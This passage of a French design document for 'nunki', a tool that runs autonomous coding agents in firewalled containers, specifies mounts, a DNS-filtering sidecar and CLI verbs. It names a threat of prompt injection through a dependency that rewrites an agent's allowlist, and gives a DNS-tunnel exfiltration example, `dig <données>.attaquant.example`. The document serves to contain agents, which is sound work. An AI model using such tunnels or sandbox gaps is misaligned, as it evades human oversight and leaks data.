+| le contrat de run | un run par lot (4.3) : ce qu'un run doit avoir produit avant de sortir — le lot commité et prouvé ou l'échec dit, arbre commitable, bloc `ÉTAT DE REPRISE` en tête du journal (écrit aussi toutes les 45 minutes en cours de run), et pour le dernier lot le verdict. Pour le codeur, ce bloc se termine par la ligne `Lot: <lot> — done`, `Lot: <lot> — failed: <raison>`, ou — seulement quand le lot est fini hormis des survivants dont il ne peut pas donner l'équivalence — `Lot: <lot> — awaits ruling: <quoi>`, chaque identifiant de survivant entre accents graves dans `<quoi>` : la seule que `nunki` lise pour savoir le lot fini | l'agent, par `MISSION.md` ; `nunki`, à la sortie et aux checkpoints |
+| les chemins protégés | une liste déclarative par projet, **deux modes** : refuser, refuser seulement si le fichier existe déjà sur la base. Le mode « demander » a disparu : rien ne peut demander en autonome | la porte de périmètre, et l'adaptateur harnais s'il double ; le codeur, par son prompt de rôle, qui les nomme parce que `nunki.yaml` n'est pas dans son conteneur |
+| la batterie | un script par projet, cousu depuis un fragment par stack | la porte « batterie », la CI |
+| la configuration du projet | `nunki.yaml` dans le home du projet (`~/.nunki/<id>/nunki.yaml`), **hors du dépôt**, et qui nomme le dépôt auquel il appartient (`root:`) — le home porte l'identifiant de la session, jamais le nom du dossier, et `root:` reste la source de vérité si le registre et le home se contredisent : harnais, stacks, branches protégées, chemins protégés, liste blanche par stack, borne de volets, niveau d'exigence par défaut (`rigor:`), seuil de mutation du niveau `standard` (`mutation_threshold:`, un pourcentage entier de 1 à 100, 80 par défaut, refusé hors de cet intervalle), délais, dossier des identifiants de test, script de lancement (`run:`), modèle du harnais (`model:` — aucun nom n'est vérifié contre une liste : `nunki` connaît des harnais, pas des modèles, et c'est le harnais qui refuse ce qu'il ne connaît pas), mode de permission (`permission_mode:`, `auto` par défaut — voir le tableau des harnais en 4.3), fichier de services du projet (`services_file:`) et qui tient les branches protégées côté forge (`forge_protection:`, `forge` par défaut ou `by_hand`). `MISSION.md` prime sur lui pour ce qu'il redéclare | `nunki` |
+| le conteneur | un **Dockerfile** par stack (les anciennes « features » deviennent des étapes, l'image pré-crée les points de montage avec l'uid de l'hôte) et un fichier **Compose par profil, généré par `nunki`** à chaque lancement — voir 4.2. **Tous les conteneurs d'agent sont autonomes** : derrière un pare-feu en liste blanche, sans supervision humaine dedans, arrêtables par `nunki`. Deux variantes d'un même profil autonome — **mission** (codeur : aucun service externe) et **système** (intégrateur et sécurité : pare-feu élargi aux services déclarés, identifiants de test montés, services à côté). Un profil **interactif** n'existe que pour un seul usage possible : héberger le **HQ** lui-même si l'humain choisit de le faire tourner en conteneur plutôt que sur sa machine ; un `devcontainer.json` de quelques lignes est la **vue IDE** de ce profil, et rien de plus. Aucun agent ne tourne jamais en interactif | le moteur de conteneurs, par sa commande Compose |
+| le HQ du projet | `~/.nunki/<id>/hq/` : journal, tableau de bord, file de remontées, discussions, **et l'état de `nunki`** (4.2). Jamais monté dans un conteneur, hormis le dossier de chaque mission | le superviseur, `nunki` |
+| le registre des sessions | `~/.nunki/sessions.json` : une ligne par projet, **un identifiant et le chemin de son dépôt**, parce qu'un home nommé d'après le dossier du dépôt refuserait le second projet appelé `api` au lieu de le servir. C'est un **index**, jamais l'autorité : chaque home nomme son dépôt (`root:`), donc un registre perdu se reconstruit depuis les homes, et un registre qui contredit un home est refusé plutôt que suivi. `nunki init` ouvre une session, `nunki sessions` les liste, et `nunki adopt <id>` réinscrit un dépôt déplacé — en refusant tant que l'ancien chemin abrite encore un dépôt, qui est le projet de quelqu'un | `nunki` |
+
+**Les montages, par profil.** « Où vit le dossier de mission » décide de
+tout le reste : l'agent y écrit son journal pendant que
+le HQ y écrit le suivi, la sécurité doit y écrire alors que le code est en
+lecture seule, et la porte « arbre propre » ne doit pas le voir.
+
+| profil | l'arbre du slot | le dossier de mission | identifiants | services |
+|---|---|---|---|---|
+| mission (codeur) | lecture-écriture | **hors de l'arbre**, au HQ : `~/.nunki/<projet>/hq/missions/<id>/`, monté dans le conteneur — **quatre fichiers en écriture** (`JOURNAL.md`, `PR.md`, `VERDICT.json`, `MUTANTS.triage.json`), le reste en lecture seule | aucun | aucun |
+| système (intégrateur) | lecture-écriture | idem, sauf `MUTANTS.triage.json`, en lecture seule : **trois fichiers en écriture** (`JOURNAL.md`, `PR.md`, `VERDICT.json`) | les fichiers nommés par la mission, en lecture seule, depuis le dossier réservé | ceux de la mission, à côté |
+| système (sécurité) | **lecture seule**, plus les répertoires d'écriture déclarés par la stack en volumes | idem, sauf `PR.md` et `MUTANTS.triage.json`, en lecture seule : **deux fichiers en écriture** (`JOURNAL.md`, `VERDICT.json`) | idem | idem, jamais arrêtés depuis le profil précédent |
+| interactif (HQ) | lecture-écriture | tout `~/.nunki/<projet>/` | ce que l'humain décide | ce que l'humain décide |
+
+**Le dossier de mission vit au HQ, pas dans le slot.** Il est sous
+`~/.nunki/<projet>/hq/missions/<id>/` et monté dans le conteneur, plutôt que
+rangé dans le slot et protégé de git par une exclusion locale. Le dossier reste
+partagé entre
+l'hôte et le conteneur par un montage, et c'est ce partage qui fait que le HQ
+et l'agent communiquent par fichiers, sans canal. Ce qu'on y gagne : le
+journal partagé sans le commiter, l'arbre propre sans exclusion à maintenir,
+et un dossier qui survit à `nunki slot rm`.
+
+**Ce que l'agent peut y écrire, et rien d'autre.** Un dossier entièrement en
+écriture, `MISSION.md` compris, dont l'en-tête — liste blanche, identifiants,
+borne — serait relu par `nunki` à chaque run, laisserait un agent, ou un prompt
+injecté par une dépendance qu'il lit, s'écrire un domaine et un fichier
+d'identifiants de plus au run 1 et les obtenir au run 2. Donc :
+
+1. L'agent n'écrit que dans les fichiers que son rôle lui donne, montés un
+   à un en écriture par-dessus le dossier en lecture seule : le codeur dans
+   **`JOURNAL.md`, `PR.md`, `VERDICT.json` et `MUTANTS.triage.json`**,
+   l'intégrateur dans les mêmes sauf **`MUTANTS.triage.json`**, l'agent
+   sécurité dans **`JOURNAL.md` et `VERDICT.json`** seulement.
+   `MUTANTS.triage.json` est au codeur seul : les survivants ne
+   retournent qu'à lui (4.4, « Qui écrit quoi ») — l'intégrateur ne joue
+   pas la porte 7, l'agent sécurité ne commite rien —, et une issue qui
+   compte ne peut donc s'écrire dans le profil d'aucun autre rôle ; les
+   deux autres le lisent par le montage en lecture seule du dossier. Quant
+   à `PR.md`, l'agent sécurité le lit et ne l'écrit pas : son rapport
+   n'atteint la pull request que par la section que `nunki push` écrit à
+   partir du verdict (4.5).
+   `MISSION.md`, `FOLLOWUP_HQ.md` et `MUTANTS.json` leur sont montés en
+   **lecture seule** : ils sont à l'humain et au HQ. Ce que chaque rôle peut
+   écrire est dit en un seul endroit du code, et le texte de rôle le lit là.
+
+   Le quatrième fichier va avec la porte 7 (4.4) : le codeur doit pouvoir répondre aux survivants d'une campagne, et deux de
+   ses trois réponses sont du code. Il est séparé de `MUTANTS.json` — qui
+   porte la campagne et les équivalences — parce que **ce qui décide qui a
+   écrit quoi est le montage, pas le contenu** : `nunki` ne peut pas lire un
+   fichier et savoir de quelle main vient une ligne.
+2. `nunki` **ne relit jamais l'en-tête** du dossier pendant la mission. Il le
+   **fige dans son état** (`~/.nunki/<projet>/hq/state/`) au moment où l'humain
+   valide le cadrage, et c'est cette copie figée qui génère chaque Compose et
+   chaque liste blanche.
+3. Changer la forme d'une mission en cours est un geste du HQ, par un verbe
+   (`nunki mission reframe`), qui remet le cadrage devant l'humain et refige
+   l'en-tête ; jamais une édition du fichier. Le verbe **dit d'abord ce qui changerait et ne change
+   rien**, champ par champ — ce qui compte est quelle **décision** bouge, et
+   un diff du texte sérialisé rapporterait une liste réordonnée comme un
+   changement et un lot renuméroté comme deux. Il refuse pendant un run (le
+   périmètre changerait sous un agent qui est dedans) et il refuse un
+   cadrage qui supprime le lot en cours : l'état pointerait sur un travail
+   que personne n'a décrit, et il n'y a pas de supposition honnête à faire.
+
+### 4.1 bis — Le pare-feu
+
+Un pare-feu de conteneur naïf est troué sur quatre points : lancé par `sudo`
+par un utilisateur qui l'a, il est désactivable par l'agent ; un échec au
+démarrage laisse le conteneur sans règles, en silence ; un port 53 ouvert vers
+toute adresse ; des plages privées ouvertes, qui laissent le conteneur « sans
+services » du codeur atteindre chaque service de la machine. Deux pièges de
+plus : le résolveur embarqué de Docker **relaie toute requête DNS** vers
+l'amont, donc « ouvrir le port 53 vers le résolveur du moteur » laisse le
+tunnel DNS ouvert (`dig <données>.attaquant.example`) ; et re-résoudre les
+domaines pendant une campagne exige de garder une capacité qu'une règle
+« rendue après le démarrage » aurait rendue. D'où :
+
+1. **Le garde est un conteneur à part.** Chaque conteneur d'agent est
+   accompagné d'un **sidecar pare-feu**, minuscule, qui **possède l'espace
+   réseau** que l'agent rejoint (le sens est vérifié par exécution, voir
+   4.2). Lui seul détient des capacités — `NET_ADMIN` et `NET_RAW` pour
+   poser les règles, `SETUID` et `SETGID` parce que son résolveur descend
+   sur son propre uid, et que c'est cet uid qui distingue ses requêtes de
+   celles de l'agent (mesuré : sans elles, « failed to change group-id to
+   dip: Operation not permitted ») ; c'est lui, et non l'agent, qui
+   s'attache au réseau des services du projet.
+
+   **Les services du projet sont clôturés par `nunki`, jamais par leur
+   fichier.** Chacun est sur un seul réseau que `nunki` déclare `internal`
+   et sans passerelle sur l'hôte (l'option du pilote Docker
+   `com.docker.network.bridge.inhibit_ipv4`, et `enable_ipv6: false`) —
+   mesuré : un réseau seulement `internal` laisse un service joindre un port
+   que l'hôte publie, par l'adresse de la passerelle. Le pare-feu le rejoint
+   à côté du réseau par défaut ; aucun port n'est publié. Toutes les
+   capacités sont retirées et un jeu fixe de quatre est rendu (`CHOWN`,
+   `DAC_OVERRIDE`, `SETGID`, `SETUID`, mesuré comme le plus petit qui fait
+   démarrer Postgres, QuestDB et nginx, puis redémarrer chacun sur les
+   données qu'il a écrites — sans `DAC_OVERRIDE`, Postgres démarre une fois
+   et plus jamais ; `DAC_READ_SEARCH` le relancerait aussi, mais c'est à lui
+   que le profil seccomp par défaut de Docker ouvre `open_by_handle_at`, qui
+   ouvre un fichier par son handle hors de la vue du conteneur), avec
+   `no-new-privileges`, une borne de
+   mémoire et une borne de processus. Le pare-feu n'a pas de chaîne
+   `forward` : c'est `cap_drop` qui empêche un service de router par son
+   espace réseau. L'agent tourne **sans
+   aucune capacité** (`cap_drop: [ALL]`, `no-new-privileges`), directement
+   sous l'uid de l'hôte (`user:` dans le Compose généré, ce que le sidecar
+   rend possible : plus d'entrypoint root à abandonner), sans `sudo`, sans
+   binaire setuid dans son image : il n'y a rien à défaire chez lui, et une
+   évasion de son processus ne trouve aucun pouvoir à côté.
+2. **Un sidecar qui échoue est un agent qui ne démarre pas.** Le conteneur
+   d'agent dépend du sidecar en bonne santé ; si les règles ne se posent
+   pas, rien ne se lance. Jamais un agent sans règles.
+3. **Le sidecar est le seul résolveur DNS** du conteneur, et il est
+   **filtrant** : il ne répond que pour les domaines de la liste blanche et
+   rend NXDOMAIN pour tout le reste, sans jamais relayer. Il ne suffit pas
+   de l'écrire dans `/etc/resolv.conf` — le moteur y met le sien, et
+   l'agent pourrait interroger un autre serveur : le sidecar **détourne
+   tout le port 53** de l'espace réseau partagé vers lui-même, et refuse le
+   reste. C'est ce détournement que la sonde de `nunki check` mesure. Le tunnel DNS est
+   fermé par construction, dans tous les profils.
+4. **Les adresses autorisées suivent les réponses DNS.** Le sidecar, qui
+   répond lui-même aux questions d'adresse, ajoute au fil de l'eau les
+   adresses résolues pour un domaine autorisé (un ensemble d'adresses que
+   les règles consultent). Un domaine derrière un CDN qui change d'adresse
+   en cours de campagne reste joignable, sans re-résolution périodique et
+   sans qu'aucun pouvoir ne vive dans le conteneur de l'agent.
+5. **Aucune plage privée n'est ouverte** par défaut. Un service de l'hôte ou
+   un réseau nommé s'ouvre parce que la mission le déclare, adresse par
+   adresse.
+6. La liste blanche est **par rôle** : celle du codeur est ce que sa stack
+   déclare pour ses dépendances (registres de paquets) **plus ce que
+   l'adaptateur de harnais déclare nécessaire** (l'API du modèle), et rien
+   d'autre ; pas de forge, pas de tronc commun — `nunki check` est rouge si un
+   domaine de la forge du projet apparaît dans la liste du profil mission,
+   même via une stack, sans l'arbitrage écrit qu'exige 3.2. Celle de
+   l'intégrateur et de la sécurité y ajoute les services de la mission.
+7. `nunki check` **sonde de l'intérieur** : depuis un conteneur du profil
+   mission, et depuis un conteneur du profil système d'une mission donnée
+   (`--mission <id>`), joindre un domaine interdit, résoudre un nom hors
+   liste et joindre une adresse privée non déclarée doivent échouer. Ces
+   sondes existent déjà comme test vivant du dépôt — `cargo test --test
+   firewall -- --ignored` lève la paire depuis un Compose généré et essaie
+   de sortir par sept chemins. Une sonde ne vaut que si elle réussirait sans
+   le pare-feu : une sonde qui échoue de toute façon (un certificat, une
+   adresse inexistante) ne prouve rien, d'où une connexion TCP nue et un
+   voisin levé exprès sur le réseau du slot.
+   **Depuis le profil système** (`nunki check --mission`), la sonde
+   lève le plan même de `nunki verify` pour l'intégrateur, depuis l'en-tête
+   figé, mais sous un slot `<slot>-check` : tout ce que `nunki` nomme d'après le
+   slot — projet Compose, réseau, volumes nommés — est alors celui du
+   contrôle, et la base de données du projet est levée **à côté** de celle du
+   slot, jamais sur ses volumes (seul un volume à `name:` explicite dans le
+   fichier de services du projet y échapperait). Elle ajoute deux sondes que
+   seul ce profil a : chaque service déclaré par la mission se résout, et
+   chaque service que le projet lève **sans que la mission le déclare** ne se
+   résout pas — il est sur le même réseau, et le résolveur de Compose le
+   donnerait sans le pare-feu (mesuré). Joindre un service **sur son port**
+   n'est pas sondé : `nunki` ne sait pas sur quel port il écoute, et le dit
+   « non vérifié » plutôt que d'inventer un vert. **Les sondes demandent un
+   nom absolu** (`db.`, jamais `db`) : le moteur recopie la liste `search` de
+   l'hôte dans chaque conteneur, et le `nslookup` de busybox n'interroge alors
+   que `db.<domaine>`, jamais `db` lui-même. Sur un hôte qui porte un domaine
+   de recherche (le coureur Ubuntu de GitHub, un poste Linux sous un domaine
+   DHCP), le service déclaré ressortirait « refusé » de la sonde alors que
+   `nc -z db 80` le joint — la libc honore `ndots:0` et essaie le nom nu,
+   `nslookup` non — et `nunki check` signalerait une violation qui n'en est
+   pas une ; un Mac, dont les conteneurs n'ont pas de liste `search`, ne le
+   montre jamais. Les deux batteries vivantes posent donc une liste
+   `search` sur le sidecar, pour que la preuve soit la même sur chaque
+   plateforme.
+
+**Où vit l'image du sidecar.** Les fragments de
+stack sont **ce que `nunki init` écrit pour un projet** — Dockerfile, liste
+blanche, batterie — et jamais l'endroit où `nunki` range ses propres affaires.
+Le contexte de build du pare-feu appartient à `nunki` : il est **embarqué dans
+le binaire** et écrit dans un contexte temporaire au moment de construire
+l'image. Deux raisons au-delà du rangement : les fragments sont au projet, qui
+peut les modifier, et le pare-feu ne l'est pas ; et le fichier qui décrit la
+cage de l'agent n'a rien à faire là où un agent ou un projet pourrait le
+changer.
+
+Ce que le sidecar coûte : un conteneur de plus par agent, que `nunki` lève et
+arrête avec lui, invisible pour l'humain ; et une différence de moteur, parce
+que « partage l'espace réseau de ce service » s'écrit `network_mode:
+"service:<agent>"` sous Docker Compose et seulement `container:<nom>` sous
+`podman-compose` — c'est à l'adaptateur de moteur de le savoir (4.2).
+
+### 4.2 Le moteur — `nunki`
+
+Une commande, sur la machine de l'humain, hors conteneur. Elle pilote des
+clones, des conteneurs et des runs d'agent. Elle ne connaît le harnais que
+par un adaptateur (4.3), et le moteur de conteneurs que par un autre.
+
+| verbe | fait |
+|---|---|
+| `nunki init <dépôt>` | rend un dépôt **existant** orchestrable. Dans le dépôt, en respectant 3.3 : un `AGENTS.md` absent — un point de départ pour les règles du projet, sans rien de `nunki` (4.1) —, un `CLAUDE.md` absent qui l'importe, et un `.gitattributes` absent — rien d'autre. Dans le home du projet (`~/.nunki/<projet>/`) : `nunki.yaml` avec la liste des chemins protégés, le HQ (`hq/`), et les fragments de stack (`stacks/<nom>/`) avec la batterie cousue et le Dockerfile. Crée ce qui n'existe pas ; ne dépose à côté que ce dont il a une version nouvelle à proposer (3.3) — jamais `AGENTS.md` ni `CLAUDE.md`, qui sont au projet : un `AGENTS.md` gardé, le résumé dit que rien de `nunki` n'y manque, puisque ses règles voyagent dans le prompt de rôle. Ne touche à rien d'autre, ne tient aucun manifeste, ne désinstalle rien. Rejouable. **Sur un terminal, un premier `init` demande** ce que `nunki.yaml` déclarera — les stacks et leurs répertoires, la forge qu'aucun agent n'atteint, qui tient les branches protégées (`forge` ou `by_hand`), le `permission_mode`, les branches protégées — en proposant ce que le dépôt dit déjà : les stacks que ses manifestes déclarent (`Cargo.toml` ; `pyproject.toml`, `requirements.txt`, `setup.py` ; un `package.json` qui dépend de `next`), sur deux niveaux, hors dépendances et code vendu, une stack couvrant ses sous-répertoires ; l'hôte de son `origin` ; celles de `main`, `master`, `dev`, `develop` qu'il porte. Détecter n'est que proposer : `nunki` lit des manifestes, il n'en écrit pas (1, pas un générateur). Chaque question a son drapeau (`--stack`, `--forge`, `--forge-protection`, `--permission-mode`, `--protected-branch`), qui y répond d'avance ; `--yes` prend toutes les propositions. Rien n'est écrit avant la confirmation, et une réponse illisible est redemandée, trois fois au plus. Hors terminal et sans `--yes`, rien n'est détecté ni demandé : seuls les drapeaux comptent. `nunki init --refresh` remplace les fichiers de fragment qu'un nunki plus ancien a écrits et que personne n'a touchés (« les fragments suivent nunki », plus bas). Une fois `nunki.yaml` écrit, plus rien n'est demandé — il n'est jamais réécrit — mais une stack que les manifestes déclarent et que le fichier ne déclare pas est signalée. |
+| `nunki slot add/reset/rebuild/rm` | un slot = un clone local sans liens durs, un jeu de volumes nommés, et **trois profils de conteneur successifs** (voir « slots et branches » ci-dessous). Les missions s'y succèdent. |
+| `nunki mission new/start/reframe/status/say/watch/pause/resume/stop/kill/end/accept/iterate/fetch/archive` | le cycle d'une mission, du cadrage au rapatriement des commits ; `say` dépose une consigne pour le **run suivant**, `watch` rend deux états (tourne, fini) plus un troisième que l'humain provoque (gelé), `stop` termine le run proprement (4.3), **`end` déclare la mission abandonnée** |
+| `nunki exec <slot> <cmd>` | joue une commande dans le conteneur du slot — c'est ainsi que le HQ **rejoue une preuve** sans avoir la stack sur l'hôte. Par défaut sur la **copie git propre de `HEAD`** que la porte 7 utilise, pas sur l'arbre que l'agent a habité : un `Makefile`, un `pytest.ini` ou un alias `cargo` posé par l'agent y tromperait la preuve. Jamais pendant un run sur l'arbre de travail. Un slot dont les conteneurs sont arrêtés est d'abord relevé avec le profil que le dernier lancement a écrit — sans quoi chaque porte jouée dans la copie reste injouée, et le run suivant, qui n'est lancé qu'une fois ces portes jouées, ne part jamais |
+| `nunki verify <mission>` | les portes de vérification sur la mission du codeur, puis enchaîne la mission d'intégration, puis la mission de sécurité, chacune avec ses portes ; à la première rouge, applique les règles d'itération (4.5) ; à la fin, rend la main à l'humain pour la validation du push. **Reprenable** : son état est persisté à chaque transition, et le relancer reprend au même point |
+| `nunki mutants run --slot <slot>`, `nunki mutants status` | une campagne hors mission, sur la base telle que le dépôt de l'humain l'a, dans un slot qu'aucune mission ne tient : sur les fichiers changés depuis la dernière terminée, chacun en entier, sur tout le code avec `--whole`, ou sur les survivants de la dette par leur nom avec `--owed` ; `status` la relit dans la dette du projet et ne lance jamais rien (4.4, porte 7) |
+| `nunki mission new <mission> --branch <branche> --harden` | cadre une mission de durcissement : les tests qui tuent la dette du projet, au niveau `standard`, ses survivants figés dans l'en-tête, autant que le budget de sa campagne en mesure (4.4, porte 7) |
+| `nunki mutants debt [--equivalent <survivant> --because <pourquoi> \| --ratify <survivant> \| --ratify --all]` | liste la dette du projet, ou la tranche une fois pour le projet dans le registre des équivalences que les missions lisent ; un survivant tranché quitte la dette (4.4, porte 7) |
+| `nunki push <mission>` | après validation humaine explicite (un argument, pas un dialogue), pousse la branche depuis le dépôt principal et ouvre la pull request. C'est le seul verbe qui touche la forge en écriture, et il refuse sans `INTEGRATED` et `CLEAR` sur le dernier commit et le verdict du codeur sur son ancêtre (4.4). Il parle à l'API de la forge avec un credential de l'humain, rangé à côté des comptes (`~/.nunki/forge-token`, un jeton GitHub qui peut ouvrir des pull requests) et jamais monté dans un conteneur — un conteneur ne voit du HQ que son propre dossier de mission, un niveau plus bas. **Le même `--yes` couvre le push et l'ouverture** : un verbe, un argument. Titre et corps viennent du `PR.md` de la mission (la première ligne qui dit quelque chose est le titre) ; le corps est `PR.md` tel qu'il est écrit, suivi de la note sur les écarts puis de la section Security que `nunki` écrit à partir du verdict, sans toucher `PR.md` (4.5) ; sans `PR.md`, ou vide, la branche est poussée et aucune pull request n'est ouverte ; une pull request déjà ouverte pour la branche — second push après un volet — est retrouvée, pas signalée en échec. Sans credential, sur une remote dont la forge n'a pas d'adaptateur, ou si la forge refuse, **le push reste fait** et `nunki` rend l'adresse exacte à ouvrir avec la raison : un push rapporté rouge serait relancé, et le second `git push` ne ferait rien qu'effacer la trace du premier. **Un adaptateur par forge**, comme il y en a un par harnais (4.3) et un par moteur de conteneurs (4.2) : ce qui est propre à une forge — l'adresse de son API, la forme de ses requêtes, la façon dont une remote nomme un dépôt — vit dans son adaptateur, et rien au-dessus ne le connaît. GitHub est le seul implémenté ; une remote ailleurs est **dite ailleurs, jamais devinée**, et ajouter GitLab est un fichier à écrire, pas un remaniement. Client HTTP : `ureq` ; ses racines de confiance sont celles de Mozilla, embarquées (`webpki-roots`, données sous CDLA-Permissive-2.0, exception écrite dans `deny.toml` pour cette seule crate) — un proxy d'entreprise qui re-signe le TLS serait la raison d'y revenir |
+| `nunki check [--mission <id>]` | dit si un dépôt, ses slots et leurs conteneurs sont dans l'état que ce fichier décrit ; rouge si une restriction n'est pas tenue ; sonde le profil mission sans argument, et le profil système d'une mission donnée avec `--mission` ; **dit ce qu'il n'a pas pu vérifier** (la forge sans credential ou quand l'humain tient la protection à la main, LF quand un `.gitattributes` existant ne le force pas) |
+| `nunki logs <mission>` | rend la sortie structurée des runs, lisible |
+
+**Qui pousse, en une phrase.** L'humain valide ; `nunki push`, lancé par la
+session HQ sur l'ordre de l'humain, pousse ; aucun agent ne pousse jamais. Il
+n'y a pas de push intermédiaire vers `dev` : une mission, une pull request,
+un push.
+
+**Le verbe s'appelle `verify`, pas `close`.** « close » laisserait croire
+qu'il s'agit de clôturer la mission du codeur, alors que le verbe couvre toute la phase de vérification —
+portes, intégration, sécurité, itérations — jusqu'à la validation humaine.
+Son résultat est `VERIFIED`, ou l'échec nommé. « Clôturer » redevient un mot
+pour ce qui vient après le push : `nunki mission archive`. Il **déplace**, il
+n'efface jamais — les journaux, le texte de la pull request et les verdicts
+sont le compte rendu de ce qui a été fait — et il laisse le slot tranquille :
+`nunki slot reset` et `nunki slot rm` sont les verbes d'un slot. Il refuse une
+mission encore en travail : l'archiver la cacherait au lieu de la clore. Les
+deux endroits où une mission se termine sont `Verified` et « rendue à
+l'humain », et la seconde compte : sinon le HQ garde des missions que
+personne ne peut clore.
+
+**`end`.** `stop` termine un **run**, `archive` clôt une mission **finie**,
+et entre les deux se tient une mission qu'un humain abandonne — encore en `Coding`, jamais vérifiée, impossible à clore.
+`nunki mission end <mission> --because <pourquoi>` la clôt, et `archive` la range
+ensuite. La raison n'est pas facultative : une mission abandonnée sans raison
+est une énigme pour qui la retrouve six mois plus tard, et elle est écrite là
+où un humain la lit, dans `FOLLOWUP_HQ.md`, pas seulement dans l'état. Le
+verbe vaut **partout où une mission peut encore être travaillée** — un verbe
+qui marcherait dans cinq étapes sur sept est un verbe sur lequel l'humain ne
+peut pas compter au moment où il veut sortir — et refuse sur une mission déjà
+terminée. **Une mission jamais démarrée se clôt aussi** : `end --because`
+écrit sa raison dans son `FOLLOWUP_HQ.md`, et `archive` déplace son dossier
+comme pour toute autre, sans état à déplacer avec lui. Seul un état
+**absent** veut dire « jamais démarrée » : un état illisible reste une
+erreur, et une mission que personne n'a cadrée est refusée.
+
+**Ce que les listes disent.** `nunki mission list` donne l'étape de chaque
+mission en un mot — `framed`, `coding`, `gates`, `integration`, `security`,
+`findings`, `campaign`, `handed-over`, `verified` ou `pushed` — et
+`--active` ne garde que les missions démarrées et pas archivées.
+`nunki slot list` nomme la mission qui occupe chaque slot, ou dit `free` :
+une mission démarrée occupe son slot jusqu'à son archivage.
+
+`nunki slot reset` remet un slot au propre **sans le détruire** : le clone
+reste — `nunki slot rm` est le verbe qui supprime — et ce qui part, c'est le
+travail en cours et les **volumes nommés** du slot. C'est la vraie raison
+d'y toucher : un cache de compilation ou un répertoire d'état de harnais
+devenu mauvais survit à toutes les reconstructions d'image, et rien d'autre
+ne l'atteint. Il refuse sur les mêmes bases que `rm`, et tant qu'un run ou
+une campagne de mutation est en vol dans le slot. **Un état qui ne se lit pas
+n'est pas un état qui dit que rien ne tourne** : le reset refuse aussi quand
+l'état d'une mission non archivée ne se lit pas, ou quand le magasin d'état
+ne s'ouvre pas, puisqu'il ne peut alors pas dire si cette mission tourne
+dans le slot. **Une liste de missions qui ne se lit pas n'est pas une liste
+vide** : le reset refuse aussi quand `missions/` ne se lit pas, en nommant le
+répertoire ; et un run que le magasin d'état enregistre dans le slot bloque
+le reset, que le dossier de sa mission soit listé ou non — chaque fichier
+d'état non archivé est lu. Il nomme le fichier et la raison, et ne change
+rien : ni
+l'arbre, ni un conteneur, ni un volume. Une mission cadrée et jamais démarrée
+n'a pas d'état, et se lit toujours comme rien en vol. Seules les missions non
+archivées comptent, pour qu'un vieux fichier cassé ne bloque pas tous les
+resets pour toujours ; le message dit comment passer : réparer le fichier,
+ou, pour une mission terminée, écarter son fichier d'état — elle se lit
+alors comme jamais démarrée, et `nunki mission archive` la clôt. La limite,
+écrite : l'état illisible d'une mission non archivée bloque le reset de
+**tous** les slots du projet, parce que le slot où elle tournait est dans le
+fichier qui ne se lit pas. **Le moteur refuse de
+supprimer un volume qu'un conteneur monte**, et un reset qui avalait ce refus
+comme « aucun volume de ce nom » laissait les caches en place. Le reset
+descend donc d'abord les conteneurs du slot — les conteneurs seulement,
+jamais un volume —, puis supprime ses volumes nommés **par leur nom**, en
+distinguant « aucun volume de ce nom » d'un refus. Un volume qu'il n'a pas pu
+supprimer est nommé, et le verbe sort en erreur.
+
+**Pourquoi un seul verbe.** Cette phase est une seule machine à états —
+codeur, puis intégrateur, puis sécurité, avec des retours en arrière — et si
+elle était découpée en verbes, ce serait à la session HQ de se souvenir où on
+en est, de relancer le bon rôle après un rouge, de vérifier que les verdicts
+portent le bon commit : exactement ce que le contexte d'une session perd.
+`verify` la tient dans un état persisté ; la session HQ le lance, le regarde
+(`status`, `logs`, `watch`) et intervient (`say`, `pause`, `stop`, `kill`),
+elle n'orchestre pas. `verify` ne pousse jamais, ne merge jamais, n'accepte
+aucun risque : ces trois gestes sont à l'humain.
+
+**L'état de `nunki` est persisté, et verrouillé.** `nunki verify` dure des heures et doit survivre à la mort de la
+session HQ, à une machine en veille, à un terminal fermé. Son état —
+mission, étape, run en cours, volets joués, tentatives par lot, verdicts et
+leurs `HEAD` — vit dans `~/.nunki/<projet>/hq/state/`, un fichier par mission,
+écrit à chaque transition. Précisément :
+
+- **Le verrou ne couvre que les verbes qui changent l'état** : `start`,
+  `verify`, `reset`, `rebuild`, `rm`, `push`. Les verbes lecteurs — `status`,
+  `logs`, `watch`, `check` — passent toujours, et `say`, `pause`, `resume`,
+  `stop`, `kill` aussi : ce sont des gestes sur un run en cours, pas des
+  transitions concurrentes. `nunki exec` lancé par `verify` s'exécute **sous**
+  son verrou, il ne le demande pas une seconde fois.
+- **L'état d'un run est persistable** : identifiant du conteneur, identifiant
+  de session du harnais, pid, écrits à chaque lancement. Un run est lancé
+  **détaché** et survit à la mort de la session HQ qui l'a lancé.
+- **La reprise re-dérive avant de décider.** Un `nunki` qui redémarre ne croit
+  pas l'état sur parole : il demande au moteur si le conteneur existe et
+  tourne. Vivant : il reprend la surveillance là où elle était. Mort (une
+  veille de la machine, Docker Desktop qui redémarre sans ses conteneurs) :
+  le run est classé interrompu pour cause du harnais, sans consommer de
+  tentative, et relancé en reprenant la session du harnais depuis le dernier
+  état de reprise du journal — la reprise à froid des missions, appliquée à
+  `nunki` lui-même.
+- **Un verrou orphelin se lève tout seul** : il porte le pid et l'heure de
+  qui l'a pris ; si ce processus n'existe plus, le verrou est libre, avec une
+  ligne dans le journal de `nunki`.
+
+**Slots et branches.** Avec un slot par rôle, les commits du codeur
+n'atteindraient l'intégrateur qu'après un aller-retour par le dépôt principal,
+un volet du codeur devrait repartir avec les commits de l'intégrateur, et la
+mutation tournerait dans un slot sur un `HEAD` qui ne serait plus le sien.
+Donc : **un slot par mission, et les trois rôles s'y succèdent** sur le même
+clone et la même branche, chacun dans son profil de conteneur — `nunki` arrête
+le conteneur du profil précédent et lève le suivant sur le même arbre. Les
+commits ne bougent jamais entre slots ; ils ne sortent du slot que par
+`nunki mission fetch`, vers le dépôt principal, au moment du push. « Un slot =
+un clone, un conteneur » devient « un slot = un clone, des volumes, un
+conteneur d'agent à la fois ».
+
+**Un slot est un clone et un miroir.** L'arbre du slot est monté dans le
+conteneur de l'agent, son `.git` compris : l'agent y commite, et il y écrit
+aussi, s'il le veut, une configuration, des hooks ou des refs. C'est pourquoi
+l'hôte ne lance jamais git dans un slot. Chaque slot a un **miroir**
+(`<projet>-slots/.nunki-git/<slot>`), jamais monté, que seul l'hôte écrit :
+tout git que `nunki` lance à propos d'un slot — portes, `slot reset`,
+`mission fetch`, l'aiguillage du lancement — lit ce miroir. Ce que `nunki`
+réécrit dans le slot (la branche, son extraction, `origin/*`, l'index), il
+l'écrit en fichiers. `slot rm` emporte le miroir.
+- *Pas de sous-modules dans un slot.* Un commit ou un index qui porte un
